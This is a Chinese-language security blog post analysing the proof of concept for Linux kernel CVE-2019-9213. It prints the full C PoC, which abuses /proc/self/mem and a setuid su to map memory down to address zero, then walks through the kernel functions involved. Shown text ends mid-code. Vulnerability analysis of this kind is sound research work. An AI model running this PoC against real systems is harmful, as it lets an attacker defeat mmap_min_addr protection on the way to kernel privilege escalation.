<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    
    
    <title>CVE-2019-9213 Poc分析 | DaJun的Blog | 脑袋空空</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="kernel">
    <link rel="shortcut icon" href="/img/girl.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	false,
            lv: JSON.parse('{"enable":true,"app_id":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","app_key":"Qn93YchF3LXlS54tbXjzMvAI","icon":true}'),
            v: JSON.parse('{"enable":true,"appid":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","appkey":"Qn93YchF3LXlS54tbXjzMvAI","notify":true,"verify":true,"placeholder":"想说什么...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="">
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/girl.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">DaJun</h5>
          <a href="mailto:571986260@qq.com" title="571986260@qq.com" class="mail">
            
              <span>5</span>
            
              <span>7</span>
            
              <span>1</span>
            
              <span>9</span>
            
              <span>8</span>
            
              <span>6</span>
            
              <span>2</span>
            
              <span>6</span>
            
              <span>0</span>
            
              <span>@</span>
            
              <span>q</span>
            
              <span>q</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                CATEGORIES
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                TAGS
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                ABOUT
              </a>
            </li>
        
            <li class="">
              <a href="/pwn-tips"  >
                <i class="icon icon-lg icon-info"></i>
                PWN TIPS
              </a>
            </li>
        
            <li class="">
              <a href="/todo"  >
                <i class="icon icon-lg icon-clock-o"></i>
                TODO
              </a>
            </li>
        
            <li class="">
              <a href="https://github.com/DayJun" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>CVE-2019-9213 Poc分析</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/dawn.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">CVE-2019-9213 Poc分析</h1>
        <h5 class="subtitle">
            
                <time datetime="2020-03-31T07:44:47.000Z" itemprop="datePublished" class="page-time">
  2020-03-31
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/CVE/">CVE</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-CVE-2019-9213-Poc分析"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">CVE-2019-9213 Poc分析</h1>
        <div class="post-meta">
            <time class="post-time" title="2020-03-31 15:44:47" datetime="2020-03-31T07:44:47.000Z"  itemprop="datePublished">2020-03-31</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/CVE/">CVE</a></li></ul>



            
	<span id="/2020/03/31/CVE-2019-9213-Poc分析/" class="leancloud_visitors" data-flag-title="CVE-2019-9213 Poc分析" title="CVE-2019-9213 Poc分析">
		
			<i class="icon icon-eye"></i>
		
		<span class="leancloud-visitors-count"></span>
	</span>
 

            
    <span class="leancloud-comment">
        <i class="icon icon-comment-o"></i>
        <a href="/2020/03/31/CVE-2019-9213-Poc分析/#comment">
            <span class="valine-comment-count" data-xid="/2020/03/31/CVE-2019-9213-Poc分析/"></span>
        </a>
    </span>



            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <p>看了许多关于这个漏洞的文章，这里进行一下自我总结</p>
<p>参考：<a href="https://cert.360.cn/report/detail?id=58e8387ec4c79693354d4797871536ea" target="_blank" rel="noopener">https://cert.360.cn/report/detail?id=58e8387ec4c79693354d4797871536ea</a></p>
<a id="more"></a>

<h1 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *<span class="built_in">map</span> = mmap((<span class="keyword">void</span>*)<span class="number">0x10000</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE,</span><br><span class="line">                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">map</span> == MAP_FAILED) err(<span class="number">1</span>, <span class="string">"mmap"</span>);</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">"/proc/self/mem"</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">"open"</span>);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="built_in">map</span>;</span><br><span class="line">  <span class="keyword">while</span> (addr != <span class="number">0</span>) &#123;</span><br><span class="line">    addr -= <span class="number">0x1000</span>;</span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, addr, SEEK_SET) == <span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">"lseek"</span>);</span><br><span class="line">    <span class="keyword">char</span> cmd[<span class="number">1000</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(cmd, <span class="string">"LD_DEBUG=help su 1&gt;&amp;%d"</span>, fd);</span><br><span class="line">    system(cmd);</span><br><span class="line">  &#125;</span><br><span class="line">  system(<span class="string">"head -n1 /proc/$PPID/maps"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"data at NULL: 0x%lx\n"</span>, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先<code>mmap</code>一页内存，以0x10000为地址，然后打开<code>/proc/self/mem</code>文件，该文件所映射的是当前进程的内存，相对文件的偏移对应的是进程的地址</p>
<p>之后进入<code>while</code>循环，一页一页的利用漏洞向前请求内存，最后从0到0x11000的内存都可以被映射</p>
<h1 id="跟进分析"><a href="#跟进分析" class="headerlink" title="跟进分析"></a>跟进分析</h1><p>文件写相关函数在此定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">proc_mem_operations</span> = &#123;</span></span><br><span class="line">	.llseek		= mem_lseek,</span><br><span class="line">	.read		= mem_read,</span><br><span class="line">	.write		= mem_write,</span><br><span class="line">	.open		= mem_open,</span><br><span class="line">	.release	= mem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>直接看<code>mem_write</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ssize_t <span class="title">mem_write</span><span class="params">(struct file *file, <span class="keyword">const</span> <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="function"><span class="params">			 <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *ppos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> mem_rw(file, (<span class="keyword">char</span> __user*)buf, count, ppos, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ssize_t <span class="title">mem_rw</span><span class="params">(struct file *file, <span class="keyword">char</span> __user *buf,</span></span></span><br><span class="line"><span class="function"><span class="params">			<span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *ppos, <span class="keyword">int</span> write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">file</span>-&gt;<span class="title">private_data</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> addr = *ppos;</span><br><span class="line">	<span class="keyword">ssize_t</span> copied;</span><br><span class="line">	<span class="keyword">char</span> *page;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!mm)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	page = (<span class="keyword">char</span> *)__get_free_page(GFP_TEMPORARY);</span><br><span class="line">	<span class="keyword">if</span> (!page)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	copied = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))</span><br><span class="line">		<span class="keyword">goto</span> <span class="built_in">free</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Maybe we should limit FOLL_FORCE to actual ptrace users? */</span></span><br><span class="line">	flags = FOLL_FORCE;</span><br><span class="line">	<span class="keyword">if</span> (write)</span><br><span class="line">		flags |= FOLL_WRITE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> this_len = <span class="keyword">min_t</span>(<span class="keyword">int</span>, count, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123; <span class="comment">//这里从buf复制到page中</span></span><br><span class="line">			copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		this_len = access_remote_vm(mm, addr, page, this_len, flags);<span class="comment">//addr就是我们Poc中的addr,this_len就是我们输入的大小</span></span><br><span class="line">		<span class="keyword">if</span> (!this_len) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!copied)</span><br><span class="line">				copied = -EIO;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;</span><br><span class="line">			copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		buf += this_len;</span><br><span class="line">		addr += this_len;</span><br><span class="line">		copied += this_len;</span><br><span class="line">		count -= this_len;</span><br><span class="line">	&#125;</span><br><span class="line">	*ppos = addr;</span><br><span class="line"></span><br><span class="line">	mmput(mm);</span><br><span class="line"><span class="built_in">free</span>:</span><br><span class="line">	free_page((<span class="keyword">unsigned</span> <span class="keyword">long</span>) page);</span><br><span class="line">	<span class="keyword">return</span> copied;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对文件写所涉及的操作就是如上注释那两个，先从buf复制到page中，然后再把page中的数据写入另一个进程中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * access_remote_vm - access another process' address space</span></span><br><span class="line"><span class="comment"> * @mm:		the mm_struct of the target address space</span></span><br><span class="line"><span class="comment"> * @addr:	start address to access</span></span><br><span class="line"><span class="comment"> * @buf:	source or destination buffer</span></span><br><span class="line"><span class="comment"> * @len:	number of bytes to transfer</span></span><br><span class="line"><span class="comment"> * @gup_flags:	flags modifying lookup behaviour</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The caller must hold a reference on @mm.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">access_remote_vm</span><span class="params">(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __access_remote_vm(<span class="literal">NULL</span>, mm, addr, buf, len, gup_flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Access another process' address space as given in mm.  If non-NULL, use the</span></span><br><span class="line"><span class="comment"> * given task for page fault accounting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *old_buf = buf;</span><br><span class="line">	<span class="keyword">int</span> write = gup_flags &amp; FOLL_WRITE;</span><br><span class="line"></span><br><span class="line">	down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">	<span class="comment">/* ignore errors, just check how much was successfully transferred */</span></span><br><span class="line">	<span class="keyword">while</span> (len) &#123;</span><br><span class="line">		<span class="keyword">int</span> bytes, ret, offset;</span><br><span class="line">		<span class="keyword">void</span> *maddr;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> = <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">		ret = get_user_pages_remote(tsk, mm, addr, <span class="number">1</span>,</span><br><span class="line">				gup_flags, &amp;page, &amp;vma, <span class="literal">NULL</span>);<span class="comment">//将另一个进程从addr开始之后的1个页固定到内存中，并将他们的指针写入&amp;page中</span></span><br><span class="line">		<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Check if this is a VM_IO | VM_PFNMAP VMA, which</span></span><br><span class="line"><span class="comment">			 * we can access using slightly different code.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			vma = find_vma(mm, addr);</span><br><span class="line">			<span class="keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)</span><br><span class="line">				ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,</span><br><span class="line">							  len, write);</span><br><span class="line">			<span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			bytes = ret;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			bytes = len;</span><br><span class="line">			offset = addr &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">			<span class="keyword">if</span> (bytes &gt; PAGE_SIZE-offset)</span><br><span class="line">				bytes = PAGE_SIZE-offset;</span><br><span class="line"></span><br><span class="line">			maddr = kmap(page);<span class="comment">//用kmap把page映射出来</span></span><br><span class="line">			<span class="keyword">if</span> (write) &#123;</span><br><span class="line">				copy_to_user_page(vma, page, addr,</span><br><span class="line">						  maddr + offset, buf, bytes);</span><br><span class="line">				set_page_dirty_lock(page);<span class="comment">//其实就相当于，memcpy(maddr+offset, buf, bytes)</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				copy_from_user_page(vma, page, addr,</span><br><span class="line">						    buf, maddr + offset, bytes);</span><br><span class="line">			&#125;</span><br><span class="line">			kunmap(page);</span><br><span class="line">			put_page(page);</span><br><span class="line">		&#125;</span><br><span class="line">		len -= bytes;</span><br><span class="line">		buf += bytes;</span><br><span class="line">		addr += bytes;</span><br><span class="line">	&#125;</span><br><span class="line">	up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> buf - old_buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后的关键点在<code>get_user_pages_remote</code>中，这个函数顺利完成我们才能调用<code>kmap</code>将地址映射出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_user_pages_remote</span><span class="params">(struct task_struct *tsk, struct mm_struct *mm,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span></span></span><br><span class="line"><span class="function"><span class="params">		struct vm_area_struct **vmas, <span class="keyword">int</span> *locked)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __get_user_pages_locked(tsk, mm, start, nr_pages, pages, vmas,</span><br><span class="line">				       locked, <span class="literal">true</span>,</span><br><span class="line">				       gup_flags | FOLL_TOUCH | FOLL_REMOTE);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(get_user_pages_remote);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">long</span> __get_user_pages_locked(struct task_struct *tsk,</span><br><span class="line">						struct mm_struct *mm,</span><br><span class="line">						<span class="keyword">unsigned</span> <span class="keyword">long</span> start,</span><br><span class="line">						<span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">						struct page **pages,</span><br><span class="line">						struct vm_area_struct **vmas,</span><br><span class="line">						<span class="keyword">int</span> *locked, <span class="keyword">bool</span> notify_drop,</span><br><span class="line">						<span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">long</span> ret, pages_done;</span><br><span class="line">	<span class="keyword">bool</span> lock_dropped;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (locked) &#123;</span><br><span class="line">		<span class="comment">/* if VM_FAULT_RETRY can be returned, vmas become invalid */</span></span><br><span class="line">		BUG_ON(vmas);</span><br><span class="line">		<span class="comment">/* check caller initialized locked */</span></span><br><span class="line">		BUG_ON(*locked != <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pages)</span><br><span class="line">		flags |= FOLL_GET;</span><br><span class="line"></span><br><span class="line">	pages_done = <span class="number">0</span>;</span><br><span class="line">	lock_dropped = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		ret = __get_user_pages(tsk, mm, start, nr_pages, flags, pages,</span><br><span class="line">				       vmas, locked);<span class="comment">//将另一个进程从addr开始之后的1个页固定到内存中，并将他们的指针写入&amp;page中，返回固定的页数</span></span><br><span class="line">		<span class="keyword">if</span> (!locked)</span><br><span class="line">			<span class="comment">/* VM_FAULT_RETRY couldn't trigger, bypass */</span></span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* VM_FAULT_RETRY cannot return errors */</span></span><br><span class="line">		<span class="keyword">if</span> (!*locked) &#123;</span><br><span class="line">			BUG_ON(ret &lt; <span class="number">0</span>);</span><br><span class="line">			BUG_ON(ret &gt;= nr_pages);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!pages)</span><br><span class="line">			<span class="comment">/* If it's a prefault don't insist harder */</span></span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (ret &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			nr_pages -= ret;</span><br><span class="line">			pages_done += ret;</span><br><span class="line">			<span class="keyword">if</span> (!nr_pages)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (*locked) &#123;</span><br><span class="line">			<span class="comment">/* VM_FAULT_RETRY didn't trigger */</span></span><br><span class="line">			<span class="keyword">if</span> (!pages_done)</span><br><span class="line">				pages_done = ret;</span><br><span 